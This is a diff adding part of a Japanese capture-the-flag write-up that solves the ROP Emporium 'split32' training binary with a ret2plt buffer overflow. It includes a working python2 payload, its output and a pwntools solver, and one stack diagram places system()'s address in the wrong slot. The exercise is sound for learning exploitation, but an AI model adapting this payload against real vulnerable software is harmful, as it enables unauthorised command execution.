@@ -173,5 +173,110 @@ fish: Process 80877, './split32' from job 1, 'python2 -c "print 'A'*44 + '\x0…
 
 だからどうにかして/bin/cat flag.txt  を実行してあげる必要がありそう。
 
+運良く、/bin/cat flag.txtの文字列があった.
 
+```
+✦ ❯ rabin2 -z split32
+[Strings]
+nth paddr      vaddr      len size section type  string
+―――――――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x000006b0 0x080486b0 21  22   .rodata ascii split by ROP Emporium
+1   0x000006c6 0x080486c6 4   5    .rodata ascii x86\n
+2   0x000006cb 0x080486cb 8   9    .rodata ascii \nExiting
+3   0x000006d4 0x080486d4 43  44   .rodata ascii Contriving a reason to ask user for data...
+4   0x00000703 0x08048703 10  11   .rodata ascii Thank you!
+5   0x0000070e 0x0804870e 7   8    .rodata ascii /bin/ls
+0   0x00001030 0x0804a030 17  18   .data   ascii /bin/cat flag.txt
+```
+
+
+
+```
+080483e0 <system@plt>:
+ 80483e0:       ff 25 18 a0 04 08       jmp    DWORD PTR ds:0x804a018
+ 80483e6:       68 18 00 00 00          push   0x18
+ 80483eb:       e9 b0 ff ff ff          jmp    80483a0 <.plt>
+```
+
+ret2pltの典型なので,
+
+'A'*44+system()のアドレス+system()のreturn adress + system()の引数 "/bin/cat flag.txt"を入力してあげればいい
+
+```
+✦ ❯ python2 -c "print 'A' * 44 + '\xe0\x83\x04\x08' + 'BBBB' + '\x30\xa0\x04\x08'" | ./split32
+split by ROP Emporium
+x86
+
+Contriving a reason to ask user for data...
+> Thank you!
+ROPE{a_placeholder_32byte_flag!}
+fish: Process 32366, './split32' from job 2, 'python2 -c "print 'A' * 44 + '\…' terminated by signal SIGSEGV (Address boundary error)
+```
+
+## 内部挙動
+
+### pwnmeのstackの内容
+
+stackの状況は以下のようになる
+
+#### exploit前
+
+\+ 高位アドレス
+
+|アドレス| 内容 |
+| ----- | :--------------------------------------: |
+| esp -> | ... |
+| |  |
+| ebp - 0x28 |                 ebp-0x28                 |
+| |                   ....                   |
+| ebp -> |                saved ebp                 |
+| ebp + 0x4 | return address for pwnme(まぁつまりmain)  |
+
+\- 低位アドレス
+
+#### exploit後
+
+\+ 高位アドレス
+
+|アドレス| 内容 |
+| ----- | :--------------------------------------: |
+| esp -> |  |
+| |  |
+| ebp - 0x28 |                 AAAA                 |
+| |                   ....                   |
+| ebp -> |                system()のアドレス 80483e0                |
+| ebp + 0x4 or system()のesp | hoge |
+| ebp + 0x8 | /bin/cat flag.txt |
+
+
+\- 低位アドレス
+
+
+
+## solver
+
+```
+from pwn import *
+
+BINARY = "./split32"
+ELF = ELF(BINARY)
+
+context.os = "linux"
+context.arch = "i386"
+context.binary = BINARY
+
+p = process(BINARY)
+
+rop = b"A" * 44 
+rop += p32(ELF.symbols["system"]) # get eip and run system()
+rop += b"HOGE" # return address of system()
+rop += p32(0x0804A030) #address of "/bin/cat flag.txt"
+
+log.success(f"ROP chain : {rop}")
+
+p.sendline(rop)
+flag = p.recvline()
+flag = p.recvall().split(b'\n')[-2]
+log.success(f"FLAG: {flag}")
+```
 
